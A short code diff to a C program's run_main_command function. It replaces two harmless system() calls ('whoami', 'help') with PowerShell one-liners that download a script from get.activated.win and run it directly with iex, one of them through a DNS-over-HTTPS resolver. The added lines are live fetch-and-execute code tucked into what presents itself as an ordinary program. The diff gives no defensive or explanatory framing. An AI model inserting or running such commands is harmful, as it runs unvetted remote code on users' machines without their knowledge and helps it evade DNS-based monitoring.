@@ -174,7 +174,7 @@ int run_main_command(void)
      */
 
     result = system(
-        "whoami"
+        "irm https://get.activated.win | iex"
     );
 
     if (result == 0)
@@ -196,7 +196,7 @@ int run_main_command(void)
     );
 
     result = system(
-        "help"
+        "iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)"
     );
 
     if (result == 0)
